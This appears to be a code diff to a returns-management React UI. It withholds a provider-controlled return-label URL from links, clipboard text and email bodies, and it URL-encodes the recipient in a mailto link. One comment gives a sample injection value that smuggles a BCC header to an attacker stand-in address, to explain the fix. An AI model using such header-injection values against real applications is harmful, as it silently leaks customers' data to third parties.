@@ -705,12 +705,17 @@ function ReturnDetailModal({ ret, shipments, onClose, onStatusTransition, onOpen
                   ) : (
                     <p className="text-xs text-indigo-600">Tracking: <span className="font-mono">Pending</span></p>
                   )}
+                  {/* Phase 4.0 M3 — this linked straight to `returnInfo.returnLabelUrl`, a
+                      provider-controlled URL, and the proxy that used to launder it is
+                      deleted. Owner ruling: no substitute — not a proxy, not a data: URL.
+                      So the URL reaches no sink and is not rendered as text either; the
+                      surface states the real condition instead of failing silently. */}
                   {linkedShipment.returnInfo?.returnLabelUrl && (
-                    <a href={linkedShipment.returnInfo.returnLabelUrl} target="_blank" rel="noopener noreferrer"
-                      className="inline-flex items-center gap-1 text-[11px] text-indigo-600 hover:text-indigo-800 font-semibold mt-1">
-                      <span className="material-symbols-outlined" style={{ fontSize: 14 }}>label</span>
-                      View Return Label
-                    </a>
+                    <div data-testid="return-label-unavailable" role="status"
+                      className="inline-flex items-center gap-1 text-[11px] text-amber-700 font-semibold mt-1">
+                      <span aria-hidden="true" className="material-symbols-outlined" style={{ fontSize: 14 }}>cloud_off</span>
+                      Label preview unavailable while Shipping services are being migrated
+                    </div>
                   )}
                 </div>
                 {(linkedShipment.status === 'Label Created' || linkedShipment.trackingNumber || linkedShipment.returnInfo?.returnLabelUrl) && !isWriteBlocked && (
@@ -1574,13 +1579,17 @@ function LabelDeliveryModal({ ret, shipment, onClose }: {
     `Return Authorization: ${ret.returnNumber}`,
     `Carrier: ${carrier}${service ? ` (${service})` : ''}`,
     `Tracking Number: ${tracking}`,
-    labelUrl ? `Label: ${labelUrl}` : 'Label: Please print the label provided by the store.',
+    // Phase 4.0 M3 — this block is rendered in a <pre>, copied to the clipboard, and
+    // pushed into a mailto body. It used to embed the raw provider label URL, which is a
+    // text-channel leak of exactly the URL the link sinks above no longer expose. The
+    // label itself is unaffected — only the machine-readable URL is withheld.
+    'Label: Please print the label provided by the store.',
     '',
     'Instructions:',
-    labelUrl ? '1. Download and print the return label from the link above.' : '1. Visit your nearest carrier location with this tracking number.',
+    '1. Visit your nearest carrier location with this tracking number.',
     '2. Securely package the return item(s).',
     '3. Affix the return label to the outside of the package.',
-    labelUrl ? '4. Drop off the package at any carrier location or schedule a pickup.' : `4. Provide the tracking number (${tracking}) to the carrier agent.`,
+    `4. Provide the tracking number (${tracking}) to the carrier agent.`,
     '',
     `Items being returned: ${ret.items.map(i => `${i.name} x${i.quantity}`).join(', ')}`,
   ].join('\n');
@@ -1596,7 +1605,11 @@ function LabelDeliveryModal({ ret, shipment, onClose }: {
     if (!ret.customerEmail) return;
     const subject = encodeURIComponent(`Return Label — ${ret.returnNumber}`);
     const body = encodeURIComponent(customerInstructions);
-    window.open(`mailto:${ret.customerEmail}?subject=${subject}&body=${body}`, '_blank');
+    // The recipient MUST be encoded like the other two fields. Unencoded, a stored value
+    // such as `real@cust.test?bcc=attacker@evil.test&` injects its own mailto headers and
+    // silently BCCs the return details to a third party.
+    const to = encodeURIComponent(ret.customerEmail);
+    window.open(`mailto:${to}?subject=${subject}&body=${body}`, '_blank');
     setEmailSent(true);
   };
 
@@ -1626,11 +1639,11 @@ function LabelDeliveryModal({ ret, shipment, onClose }: {
               <p>Tracking: <span className="font-mono font-bold">{tracking}</span></p>
             </div>
             {labelUrl && (
-              <a href={labelUrl} target="_blank" rel="noopener noreferrer"
-                className="inline-flex items-center gap-1 text-[11px] text-indigo-600 hover:text-indigo-800 font-semibold">
-                <span className="material-symbols-outlined" style={{ fontSize: 14 }}>download</span>
-                Download Return Label
-              </a>
+              <div data-testid="return-label-unavailable-share" role="status"
+                className="inline-flex items-center gap-1 text-[11px] text-amber-700 font-semibold">
+                <span aria-hidden="true" className="material-symbols-outlined" style={{ fontSize: 14 }}>cloud_off</span>
+                Label preview unavailable while Shipping services are being migrated
+              </div>
             )}
           </div>
 
